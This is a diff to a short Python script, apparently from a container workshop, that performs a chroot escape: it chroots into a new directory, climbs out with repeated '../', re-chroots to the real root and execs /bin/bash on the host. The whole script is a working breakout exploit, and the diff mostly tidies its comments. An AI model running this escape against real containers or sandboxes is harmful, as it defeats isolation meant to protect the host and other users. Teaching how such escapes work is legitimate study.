@@ -1,10 +1,20 @@
 #!/usr/bin/env python
+"""Docker From Scratch Workshop - Breakout script.
+"""
 
 import os
 
+# Create a directory and chroot to it but we don't want to chdir to it
 os.makedirs('.foo')
-os.chroot('.foo')  # chroot into another directory, but we don't chdir
-# pwd still has a reference to a directory outside the (new) chroot, so
-os.chdir('../../../../../../../../')  # chdir to a directory above pwd. kernel automatically converts extra ../ to /
-os.chroot('.')  # finally chroot to the old (topmost) root
+os.chroot('.foo')
+
+# pwd still has a reference to a directory outside the (new) chroot, so chdir
+# to a directory above pwd.
+# The kernel will automatically convert extra ../ to /
+os.chdir('../../../../../../../../')
+
+# finally chroot to the old (topmost) root
+os.chroot('.')
+
+# now we can exec a shell in the host
 os.execv('/bin/bash', ['/bin/bash'])
